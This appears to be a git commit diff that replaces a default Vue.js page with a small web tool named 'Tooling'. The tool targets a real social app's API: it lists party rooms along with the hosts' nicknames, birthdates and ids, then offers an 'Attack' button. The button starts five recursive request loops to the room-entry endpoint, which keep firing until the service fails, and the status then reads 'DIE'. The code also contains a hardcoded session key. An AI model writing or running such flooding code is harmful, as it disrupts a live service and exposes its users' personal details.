62a5fbd01d5ee862b3b569924088802061d26094
hieudt-2054 <duong.trung.hieu@sun-asterisk.com>
2020-09-09 16:06:55 +0700

    Initial

--- src/App.vue
+++ src/App.vue
@@ -1,17 +1,192 @@
 <template>
   <div id="app">
-    <img alt="Vue logo" src="./assets/logo.png">
-    <HelloWorld msg="Welcome to Your Vue.js App"/>
+    <b-container v-if="!key">
+        <b-jumbotron header="Tooling" lead="Author">
+          <p>|</p>
+        </b-jumbotron>
+
+        <b-form-group
+          horizontal
+          :label-cols="4"
+          label="Enter your key"
+        >
+          <b-form-input v-model.trim="key"></b-form-input>
+        </b-form-group>
+    </b-container>
+    <b-container v-else>
+        <b-jumbotron>
+          <p>Trạng thái attacking: {{ stateAttacking }}</p>
+        </b-jumbotron>
+        <b-row>
+          <b-col>
+            <b-button @click="getRoomList">Refresh Room</b-button>
+          </b-col>
+        </b-row>
+        <br/>
+        <b-row>
+          <b-table dark small hover :items="roomList" :busy="isBusy" :fields="fields">
+            <template v-slot:table-busy>
+              <div class="text-center text-danger my-2">
+                <b-spinner class="align-middle"></b-spinner>
+                <strong>Loading...</strong>
+              </div>
+            </template>
+            <template v-slot:cell(actions)="row">
+              <b-overlay
+                :show="busy"
+                rounded
+                opacity="0.6"
+                spinner-small
+                spinner-variant="primary"
+                class="d-inline-block"
+                @hidden="onHidden"
+              >
+              <b-button variant="danger" size="sm" @click="loopAttack(row.item)">
+                Attack
+              </b-button>
+              </b-overlay>
+            </template>
+          </b-table>
+        </b-row>
+        <b-modal id="bv-modal-example" hide-footer>
+          <div class="d-block text-center">
+            <h3>Done!</h3>
+          </div>
+          <b-button class="mt-3" block @click="$bvModal.hide('bv-modal-example')">Close Me</b-button>
+        </b-modal>
+    </b-container>
   </div>
 </template>
 
 <script>
-import HelloWorld from './components/HelloWorld.vue'
+// import axios from "axios"
 
 export default {
   name: 'App',
-  components: {
-    HelloWorld
+  computed: {
+    
+  },
+  mounted() {
+    this.getRoomList();
+  },
+  watch: {
+  },
+  beforeDestroy() {
+      this.clearTimeout()
+  },
+  data () {
+    return {
+      busy: false,
+      timeout: null,
+      isBusy: false,
+      objAttacking: [],
+      stateAttacking: 'Free',
+      fields: [
+        {
+          key: 'affiliations_count',
+          sortable: true,
+          label: 'Online'
+        },
+        {
+          key: 'name',
+          label: 'Name Room',
+          sortable: true,
+        },
+        {
+          key: 'id',
+          label: 'Id Room',
+          sortable: true,
+        },
+        {
+          key: 'host.nickname',
+          sortable: false,
+          label: 'Host'
+        },
+        {
+          key: 'host.birthdate',
+          label: 'DoB Host',
+          sortable: true,
+        },
+        {
+          key: 'host.id',
+          label: 'Id Host',
+          sortable: true,
+        },
+        { key: 'actions', label: 'Actions' }
+      ],
+      roomList: [],
+      key: '1284131423787738530',
+      state: false,
+      roomId: '',
+    }
+  },
+  methods: {
+    clearTimeout() {
+        if (this.timeout) {
+          clearTimeout(this.timeout)
+          this.timeout = null
+        }
+      },
+      setTimeout(callback) {
+        this.clearTimeout()
+        this.timeout = setTimeout(() => {
+          this.clearTimeout()
+          callback()
+        }, 5000)
+      },
+      onHidden() {
+        // Return focus to the button once hidden
+        this.$refs.button.focus()
+      },
+    getRoomList () {
+      this.isBusy = true;
+      // var proxyUrl = 'https://cors-anywhere.herokuapp.com/';
+      var targetUrl = 'http://www.litatom.com/api/sns/v1/lit/user/get_party_list?page_num=1&page_size=100&loc=US&sid=session.' + this.key + '&version=3.7.1&uuid=1944739c55bbc885';
+      fetch(targetUrl, {
+        mode: "no-cors",
+      })
+      .then(blob => blob.json())
+      .then(data => {
+        this.roomList = data.data;
+        this.isBusy = false;
+      })
+      .catch(e => {
+        console.log(e);
+        this.isBusy = false;
+        return e;
+      });
+    },
+    async loopAttack(roomId) {
+      this.busy = true
+      this.stateAttacking = 'Process';
+      this.objAttacking.push(roomId);
+      this.requestRoom(roomId.id);
+      this.requestRoom(roomId.id);
+      this.requestRoom(roomId.id);
+      this.requestRoom(roomId.id);
+      this.requestRoom(roomId.id);
+    },
+    requestRoom(roomId) {
+      var self = this;
+      // var proxyUrl = 'https://cors-anywhere.herokuapp.com/';
+      var targetUrl = "http://www.litatom.com/api/sns/v1/lit/user/enter_party?party_id="+roomId+"&loc=US&sid=session."+this.key+"&version=3.7.1&uuid=1944739c55bbc885";
+      fetch(targetUrl)
+      .then(blob => blob.json())
+      .then(data => {
+        if (data.success == true) {
+          self.requestRoom(roomId);
+        } else {
+          self.stateAttacking = 'DIE'
+          self.$bvModal.show('bv-modal-example');
+          self.busy = false
+          self.getRoomList();
+        }
+      })
+      .catch(e => {
+        console.log(e);
+        return e;
+      });
+    }
   }
 }
 </script>
